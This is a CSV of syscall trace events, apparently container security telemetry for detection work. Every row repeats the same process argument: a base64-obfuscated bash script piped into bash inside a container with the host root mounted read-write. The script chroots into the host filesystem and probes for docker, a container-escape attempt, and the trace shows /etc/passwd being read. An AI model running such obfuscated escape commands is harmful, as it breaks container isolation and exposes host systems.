evt_time,syscall_type,container_mounts,proc_args,proc_nthreads,proc_nchilds,proc_fdopencount,proc_vmsize,evt_args
12:49:15.849751718,munmap,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18028,addr=7F472231C000 length=17314
12:49:15.849756096,munmap,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18008,res=0 vm_size=18008 vm_rss=2740 vm_swap=0
12:49:15.849768760,brk,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18008,addr=2406000
12:49:15.849770393,brk,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18012,res=2406000 vm_size=18012 vm_rss=2740 vm_swap=0
12:49:15.849775012,open,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18012,name=/etc/passwd flags=4097(O_RDONLY|O_CLOEXEC) mode=0
12:49:15.849787335,open,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,fd=3(<f>/etc/passwd) name=/etc/passwd flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=801 ino=1868639
12:49:15.849791844,lseek,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,fd=3(<f>/etc/passwd) offset=0 whence=1
12:49:15.849792936,lseek,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,res=0
12:49:15.849794939,fstat,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,fd=3(<f>/etc/passwd)
12:49:15.849796843,fstat,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,res=0
12:49:15.849797594,mmap,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,addr=0 length=1273 prot=1(PROT_READ) flags=1(MAP_SHARED) fd=3(<f>/etc/passwd) offset=0
12:49:15.849798987,mmap,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18016,res=7F4722320000 vm_size=18016 vm_rss=2740 vm_swap=0
12:49:15.849799498,lseek,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18016,fd=3(<f>/etc/passwd) offset=1273 whence=0
12:49:15.849799989,lseek,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18016,res=1273
12:49:15.849811521,munmap,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18016,addr=7F4722320000 length=1273
12:49:15.849813013,munmap,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,res=0 vm_size=18012 vm_rss=2744 vm_swap=0
12:49:15.849813504,close,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,fd=3(<f>/etc/passwd)
12:49:15.849814126,close,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,18012,res=0
12:49:15.849855012,brk,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18012,addr=2407000
12:49:15.849856535,brk,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18016,res=2407000 vm_size=18016 vm_rss=2744 vm_swap=0
12:49:15.849859962,brk,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18016,addr=2408000
12:49:15.849860613,brk,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,res=2408000 vm_size=18020 vm_rss=2744 vm_swap=0
12:49:15.849865903,getpgrp,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,
12:49:15.849867726,getpgrp,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,
12:49:15.849869439,rt_sigaction,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,
12:49:15.849870491,rt_sigaction,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,
12:49:15.849874008,getrlimit,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,resource=6
12:49:15.849875170,getrlimit,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,res=0 cur=-1 max=-1
12:49:15.849909655,rt_sigprocmask,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,
12:49:15.849910266,rt_sigprocmask,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,18020,
